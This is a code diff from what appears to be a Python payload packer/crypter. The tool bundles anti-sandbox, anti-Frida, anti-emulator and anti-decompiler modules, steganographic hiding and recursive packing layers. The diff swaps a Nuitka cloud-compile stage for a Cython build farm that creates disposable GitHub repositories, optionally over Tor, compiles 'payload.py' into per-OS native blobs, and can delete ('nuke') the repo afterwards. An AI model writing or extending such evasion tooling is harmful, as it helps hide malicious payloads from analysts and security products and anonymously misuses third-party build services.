@@ -2,11 +2,10 @@ import sys, os, zipfile, base64, io, tokenize, py_compile, shutil, tempfile, ran
 from datetime import datetime
 from . import utils as _nixon_utils
 from .utils import (
-    ConfigManager, GitHubNuitkaFarm, HAS_NUMPY, NEXT_H_SOURCE, STRING_SESSION_KEY, UI,
-    check_dependencies, enable_log_redirect, fast_xor_bytes, generate_xz_loader_file, next_h,
-    optimize_and_pack_binaries
+    ConfigManager, GitHubBuildFarm, HAS_NUMPY, NEXT_H_SOURCE, STRING_SESSION_KEY, UI,
+    check_dependencies, enable_log_redirect, fast_xor_bytes, next_h
 )
-from .transforms import DependencyScanner, get_random_var_name, stego_wrap_output
+from .transforms import get_random_var_name, stego_wrap_output
 from .sources import (
     ANTI_DECOMPILER_SOURCE, ANTI_EMULATOR_SOURCE, ANTI_FRIDA_SOURCE, ANTI_SANDBOX_SOURCE,
     ANTMAN_SOURCE, API_HASH_SOURCE, ATTRITION_WARFARE_SOURCE, BLOCKCHAIN_LICENSE_SOURCE,
@@ -5285,10 +5284,13 @@ def _make_farm(args, gh_token):
     """
     platform = getattr(args, 'platform', 'auto') or 'auto'
     if platform in ('auto', 'github'):
-        return GitHubNuitkaFarm(gh_token,
-                                is_public=getattr(args, 'public', False),
-                                use_tor=getattr(args, 'tor', False),
-                                tor_proxy=getattr(args, 'tor_proxy', None))
+        # Nuitka was removed (operator decision, 2026-11-17): the farm now
+        # builds per-OS Cython blobs (.pyd/.so/.dylib) through the matrix
+        # workflow in GitHubBuildFarm.create_workflow.
+        return GitHubBuildFarm(gh_token,
+                               is_public=getattr(args, 'public', False),
+                               use_tor=getattr(args, 'tor', False),
+                               tor_proxy=getattr(args, 'tor_proxy', None))
     raise ValueError("unknown build farm platform %r (implemented: github)"
                      % (platform,))
 
@@ -5725,12 +5727,13 @@ def build_parser():
                             'inline key lets an analyst call the shipped '
                             'decoder and recover every string)')
     build.add_argument('--package', nargs='+', default=None, metavar='OPT',
-                       help='Packaging and mode. All options: native = cloud '
-                            'Cython compile keeping the bytecode fallback; '
-                            'native-only = cloud Cython with no fallback; compile '
-                            '= wrap the final loader in a Nuitka EXE/ELF; cloud = '
-                            'auto-build (cf,nk); platform=github = build farm (the '
-                            'only implemented one); layers=N = recursive packaging '
+                       help='Packaging and mode. All options: native = Cython '
+                            'compile (the payload becomes a per-OS native blob: '
+                            '.pyd/.so/.dylib) keeping the bytecode fallback; '
+                            'native-only = same with no fallback; cloud = '
+                            'auto-build (cf); platform=github = build farm (the '
+                            'only implemented one; matrix builds win/linux/mac '
+                            'Cython blobs); layers=N = recursive packaging '
                             'layers; zips=N = ZIP wrapper count; stego = hide the '
                             'payload inside an image; portable = no native core, '
                             'run anywhere; all (or everything) = every LOCAL '
@@ -5740,7 +5743,6 @@ def build_parser():
                             'stego — add it explicitly for cloud builds')
     build.add_argument('--skip-cloud', action='store_true', help='Skip the cloud build farm: build the artifact locally even if --package compile/cloud would send it to the farm')
     build.add_argument('--resume', help='Resume waiting for a specific GitHub Run ID (skip upload)')
-    build.add_argument('--exclude-android', action='store_true', help='Skip Android build in Nuitka cloud compilation')
     build.add_argument('--public', action='store_true', help='Public Repo Mode (Flash Mode) - Nukes repo after build')
     build.add_argument('--no-split-bootstrap', dest='split_bootstrap',
                        action='store_false', default=True,
@@ -5865,7 +5867,6 @@ def main():
                 except Exception:
                     pass
             auto_cf = False
-            auto_nk = False
             if args.auto:
                 modes = args.auto.split(',')
                 # --skip-cloud means "build this locally". The Cloudflare
@@ -5874,15 +5875,13 @@ def main():
                 # build of a cloud recipe exits 1 on a missing CF token.
                 if 'cf' in modes and not getattr(args, 'skip_cloud', False):
                     auto_cf = True
-                if 'nk' in modes: auto_nk = True
-                if 'nk' in modes: args.compile = True                
-            if auto_nk or args.auto: 
-                 if not args.native and not args.native_only: 
+                # 'nk' (Nuitka) was removed from the recipe: the farm builds
+                # Cython blobs now. A legacy recipe that still says cf,nk
+                # degrades to cf instead of failing.
+            if args.auto:
+                 if not args.native and not args.native_only:
                      print(" [+] Auto mode enabled: Implies --native (Hybrid)")
                      args.native = True
-            if args.stego and auto_nk:
-                print(" [!] CONFLICT: --stego incompatible with cloud build")
-                sys.exit(1)
             deployed_url = args.net_url
             hmac_key = None
             # The command line wins over the stored config: an
@@ -6109,102 +6108,6 @@ def main():
                                           extra_files=_pack_extras)
                     else:
                         packed_path = t
-                    if (getattr(args, 'compile', False) or (getattr(args, 'auto', False) and 'nk' in getattr(args, 'auto', ''))) and not getattr(args, 'skip_cloud', False):
-                        if not getattr(args, 'native', False): 
-                            UI.section("PHASE 4: CLOUD COMPILATION")
-                        target_payload = packed_path
-                        if target_payload and os.path.exists(target_payload):
-                            if not gh_token:
-                                UI.fail("GitHub token required for Nuitka cloud build.")
-                            else:
-                                nk_farm = _make_farm(args, gh_token)
-                                try:
-                                    resume_id = getattr(args, 'resume', None)
-                                    if resume_id:
-                                        with UI.Task("Resuming", f"Build ID {resume_id}") as t:
-                                            run_id = nk_farm.trigger_and_wait(resume_run_id=int(resume_id), exclude_android=getattr(args, 'exclude_android', False), header_suffix=suffix.upper())
-                                            if run_id: t.success()
-                                            else: t.fail()
-                                    elif nk_farm.create_disposable_repo():
-                                        scanner = DependencyScanner()
-                                        scanner.scan_file(args.source)
-                                        dyn_pip = scanner.get_pip_install_cmd()
-                                        dyn_flags = scanner.get_nuitka_args()
-                                        
-                                        if not nk_farm.upload_file(target_payload, "payload.py"):
-                                            UI.fatal("Critical: Failed to upload payload.py - Aborting build.")
-                                            sys.exit(1)
-                                            
-                                        nk_farm.create_workflow("payload.py", exclude_android=getattr(args, 'exclude_android', False), pip_command=dyn_pip, extra_nuitka_flags=dyn_flags, python_version=getattr(args, 'python', '3.11'))
-                                        run_id = nk_farm.trigger_and_wait(exclude_android=getattr(args, 'exclude_android', False), header_suffix=suffix.upper())
-                                    else:
-                                        run_id = None
-                                        UI.fail("Failed to create/access GitHub repo")
-                                    if run_id:
-                                        dist_dir = os.path.join(os.path.dirname(target_payload), "dist")
-                                        nk_farm.download_artifacts(run_id, dist_dir)
-                                        if getattr(args, 'public', False):
-                                            nk_farm.nuke()
-                                        else:
-                                            nk_farm.delete_file("payload.py")
-                                        print(f"\n[SUCCESS] Artifacts downloaded to: {dist_dir}")
-                                        universal_path = os.path.join(dist_dir, "Universal_Loader.py")
-                                        universal_packed = target_payload.replace(".py", "_Universal_Final.py")
-                                        if os.path.exists(universal_path):
-                                            UI.item("Universal Loader", "Detecting...", "FOUND")
-                                            shutil.move(universal_path, universal_packed)
-                                            UI.item("Final Payload", universal_packed, "GENERATED")
-                                            generated_files_map[suffix] = universal_packed
-                                            shutil.rmtree(dist_dir, ignore_errors=True)
-                                            continue 
-                                        UI.section("PHASE 5: OPTIMIZATION & PACKING")
-                                        tar_path = None
-                                        with UI.Task("Optimizing", "Strip + UPX") as ot:
-                                            tar_path = optimize_and_pack_binaries(dist_dir)
-                                            if tar_path: ot.success()
-                                            else: ot.fail()
-                                        if tar_path and os.path.exists(tar_path):
-                                            with UI.Task("Packaging", "Generating XZ Self-Extracting Loader...") as pt:
-                                                master_path = target_payload.replace("_Packed.py", "_Universal_Master.py")
-                                                generate_xz_loader_file(tar_path, master_path)
-                                                pt.success(f"{master_path} ({os.path.getsize(master_path)//1024}KB)")
-                                            final_master_packed = master_path.replace(".py", "_Packed.py")
-                                            with UI.Task("Final Deliverable", "Applying 4-Layer Recursive Pack") as ft:
-                                                recursive_package(master_path, final_master_packed, num_layers=4, num_zips=1)
-                                                ft.success(final_master_packed)
-                                        else:
-                                            UI.warn("Binary optimization failed, falling back to direct loader...")
-                                            master_binaries = {}
-                                            for fname in os.listdir(dist_dir):
-                                                fpath = os.path.join(dist_dir, fname)
-                                                if os.path.isfile(fpath) and not fname.endswith((".zip", ".tar")):
-                                                    with open(fpath, 'rb') as f:
-                                                        b_data = base64.b64encode(f.read()).decode('ascii')
-                                                    if "windows" in fname.lower(): master_binaries['windows'] = b_data
-                                                    elif "linux" in fname.lower(): master_binaries['linux'] = b_data
-                                                    elif "macos" in fname.lower(): master_binaries['darwin'] = b_data
-                                                    elif "android" in fname.lower(): master_binaries['android'] = b_data
-                                            if master_binaries:
-                                                try:
-                                                    from universal_helpers import generate_master_loader_script
-                                                    master_loader_code = generate_master_loader_script(master_binaries)
-                                                    master_path = target_payload.replace("_Packed.py", "_Universal_Master.py")
-                                                    with open(master_path, 'w', encoding='utf-8') as f:
-                                                        f.write(master_loader_code)
-                                                    UI.item("Master Loader", master_path, "GENERATED")
-                                                except ImportError:
-                                                    if tar_path:
-                                                        master_path = target_payload.replace("_Packed.py", "_Universal_Master.py")
-                                                        generate_xz_loader_file(tar_path, master_path)
-                                                        UI.item("XZ Loader", master_path, "GENERATED")
-                                            else:
-                                                UI.fail("No Nuitka binaries found to wrap.")
-                                except Exception as e:
-                                    if UI.current_task:
-                                        UI.current_task.fail(str(e))
-                                        UI.current_task = None
-                                    else:
-                                        print(f" [!] Nuitka Build Error: {e}")
                     if getattr(args, 'stego', False):
                          try:
                              with open(packed_path, 'r', encoding='utf-8') as f: content = f.read()
@@ -6213,15 +6116,6 @@ def main():
                              print(f" [+] Stego Output: {stego_path}")
                          except Exception as e:
                              print(f" [!] Stego Failed: {e}")
-                    if getattr(args, 'compile', False) and suffix == "Silent":
-                        UI.section("PHASE 6: FINAL COMPILATION")
-                        with UI.Task("Compiling", f"Native Binary ({packed_path})") as t:
-                            try:
-                                cmd = [sys.executable, "-m", "nuitka", "--onefile", "--remove-output", "--assume-yes-for-downloads", packed_path]
-                                subprocess.run(cmd, check=True, capture_output=True)
-                                t.success()
-                            except Exception as e:
-                                 t.fail(str(e))
             final_rows = []
             base_name = os.path.splitext(os.path.basename(
                 getattr(args, "_original_source", args.source)))[0]
@@ -6454,20 +6348,18 @@ def main():
             farm = _make_farm(args, gh_token)
             resume_id = getattr(args, 'resume', None)
             if resume_id:
-                farm.trigger_and_wait(resume_run_id=int(resume_id), exclude_android=args.exclude_android)
+                farm.trigger_and_wait()
             else:
                 payload = getattr(args, 'payload', None)
                 if not payload:
                     UI.fatal("--payload required for new build-farm jobs")
                     sys.exit(1)
                 if farm.create_disposable_repo():
-                    scanner = DependencyScanner()
-                    scanner.scan_file(payload)
-                    dyn_pip = scanner.get_pip_install_cmd()
-                    dyn_flags = scanner.get_nuitka_args()
                     farm.upload_file(payload, "payload.py")
-                    farm.create_workflow("payload.py", exclude_android=args.exclude_android, pip_command=dyn_pip, extra_nuitka_flags=dyn_flags, python_version=args.python)
-                    run_id = farm.trigger_and_wait(exclude_android=args.exclude_android)
+                    # The matrix builds Cython blobs for every OS
+                    # (.pyd/.so/.dylib) -- no Nuitka.
+                    farm.create_workflow("payload.py")
+                    run_id = farm.trigger_and_wait()
                     if run_id:
                         dist_dir = os.path.join(os.path.dirname(os.path.abspath(payload)), "dist")
                         farm.download_artifacts(run_id, dist_dir)
